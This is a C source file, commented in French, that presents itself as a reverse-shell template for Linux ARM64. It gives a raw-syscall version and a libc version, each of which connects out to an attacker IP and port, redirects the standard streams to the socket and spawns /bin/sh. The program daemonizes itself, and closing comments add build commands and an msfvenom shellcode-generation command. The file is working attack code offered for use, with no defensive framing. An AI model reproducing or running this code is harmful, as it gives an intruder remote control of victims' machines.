/*
 * Template: Reverse Shell ARM64
 * Platform: Linux ARM64 (aarch64)
 * Connexion vers attacker, spawn shell interactif
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKER_IP   "127.0.0.1"
#define ATTACKER_PORT 4444

// Reverse shell avec syscalls ARM64
void reverse_shell_arm64_syscalls(const char *ip, int port) {
    struct sockaddr_in sa;
    long sockfd;

    // socket(AF_INET, SOCK_STREAM, 0)
    asm volatile (
        "mov x8, #198\n"        // sys_socket
        "mov x0, #2\n"          // AF_INET
        "mov x1, #1\n"          // SOCK_STREAM
        "mov x2, #0\n"          // protocol
        "svc #0\n"              // syscall
        "mov %0, x0"
        : "=r"(sockfd)
        :
        : "x0", "x1", "x2", "x8"
    );

    if (sockfd < 0) return;

    // Setup sockaddr_in
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    // connect(sockfd, &sa, sizeof(sa))
    asm volatile (
        "mov x8, #203\n"        // sys_connect
        "mov x0, %0\n"          // sockfd
        "mov x1, %1\n"          // &sa
        "mov x2, #16\n"         // sizeof(sa)
        "svc #0"
        :
        : "r"(sockfd), "r"(&sa)
        : "x0", "x1", "x2", "x8"
    );

    // dup2 loop (stdin, stdout, stderr)
    for (long i = 0; i < 3; i++) {
        asm volatile (
            "mov x8, #24\n"     // sys_dup3 (ou dup2)
            "mov x0, %0\n"      // oldfd
            "mov x1, %1\n"      // newfd
            "svc #0"
            :
            : "r"(sockfd), "r"(i)
            : "x0", "x1", "x8"
        );
    }

    // execve("/bin/sh", NULL, NULL)
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    asm volatile (
        "mov x8, #221\n"        // sys_execve
        "mov x0, %0\n"          // filename
        "mov x1, %1\n"          // argv
        "mov x2, %2\n"          // envp
        "svc #0"
        :
        : "r"(argv[0]), "r"(argv), "r"(envp)
        : "x0", "x1", "x2", "x8"
    );
}

// Version libc standard
void reverse_shell_libc(const char *ip, int port) {
    struct sockaddr_in sa;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(sockfd);
        return;
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    char *argv[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", argv, NULL);
}

int main(int argc, char *argv[]) {
    const char *ip = ATTACKER_IP;
    int port = ATTACKER_PORT;

    if (argc >= 3) {
        ip = argv[1];
        port = atoi(argv[2]);
    }

    // Daemonize
    if (fork() != 0) exit(0);
    setsid();

#ifdef ARM64_SYSCALLS
    reverse_shell_arm64_syscalls(ip, port);
#else
    reverse_shell_libc(ip, port);
#endif

    return 0;
}

/*
 * Compilation:
 *   # Native ARM64
 *   gcc reverse_shell_arm64.c -o reverse_shell_arm64
 *
 *   # Cross-compile depuis x86-64
 *   aarch64-linux-gnu-gcc reverse_shell_arm64.c -o reverse_shell_arm64
 *
 *   # Avec syscalls ARM64
 *   aarch64-linux-gnu-gcc -DARM64_SYSCALLS reverse_shell_arm64.c -o reverse_shell_arm64
 *
 * Test (QEMU):
 *   qemu-aarch64 -L /usr/aarch64-linux-gnu ./reverse_shell_arm64
 *
 * Shellcode:
 *   msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
 */
